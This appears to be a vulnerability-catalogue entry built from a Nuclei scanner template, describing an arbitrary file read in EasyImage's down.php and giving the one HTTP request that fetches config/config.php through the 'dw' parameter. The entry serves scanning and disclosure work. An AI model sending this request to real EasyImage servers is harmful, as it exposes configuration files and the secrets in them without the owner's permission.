# Vulnerability: EasyImage down.php - Arbitrary File Read
**Classification:** EASYIMAGE
**Source:** Nuclei Template (`easyimage-downphp-lfi.yaml`)

## Description
down.php file in EasyImage is vulnerable to arbitrary file read.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/application/down.php?dw=config/config.php
```

